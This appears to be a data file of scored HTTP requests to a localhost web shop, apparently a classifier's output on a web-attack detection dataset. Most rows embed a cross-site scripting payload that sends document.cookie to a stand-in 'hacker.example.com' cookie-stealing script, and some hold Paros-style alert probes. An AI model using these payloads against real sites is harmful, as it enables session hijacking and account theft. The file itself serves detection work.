idx	prob	sample
47285	0.989931	http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino Rioja&precio=100&cantidad=1sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&B1=A�adir al carrito HTTP/1.1
50347	0.989929	http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jada&password=0a3gan861&nombre=Asad&apellidos=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&email=seward_sepulvede@promotorareina.bt&dni=05599581R&direccion=Cuesta Del Mercadillo, 30 &ciudad=Valdemeca&cp=44367&provincia=Palencia&ntc=2588788
37467	0.989760	http://localhost:8080/tienda1/publico/anadir.jsp?id=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&nombre=Vino Rioja&precio=39&cantidad=34&B1=A�adir al carrito HTTP/1.1
59307	0.989757	http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino Rioja&precio=39&cantidad=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&B1=A�adir al carrito HTTP/1.1
53192	0.989757	http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino Rioja&precio=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&cantidad=98&B1=A�adir al carrito HTTP/1.1
49969	0.988649	http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dana&password=ibe2io&nombre=Tiago&apellidos=Burunat Jaraba&email=klyaro@hostrofessional.com.kg&dni=26315307Hparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2&direccion=Pla�a Font Soleia 172, &ciudad=Plasenzuela&cp=40194&provincia=Albacete&ntc=2227850098385549&B1=Registrar HTTP/1.1
46207	0.988433	http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mandel&pwd=tras3jada&remember=off&B1=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1
45117	0.988299	http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cleve&password=guiSada&nombre=Lila&apellidos=Fen�s Montanuy&email=bekkouche@aadsl.hu&dni=74492868P&direccion=Padre Isla, S/N, &ciudad=Castrillo de Duero&cp=48950&provincia=Baleares (Illes)bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&ntc=0414805520602488&B1=Registrar HTTP/1.1
57626	0.988275	http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rosalyn&password=0m84n750&nombre=Jeannette Amelie&apellidos=Esguevillas Abizanda&email=janda@sayuela.aw&dni=04452062K&direccion=Calle Carassa 117, &ciudad=Galinduste&cp=16268&provincia=A Coru�a&ntc=8900090922020406&B1=Registrarsessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.
46765	0.987923	http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso Manchego&precio=39&cantidad=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&B1=A�adir al carrito HTTP/1.1
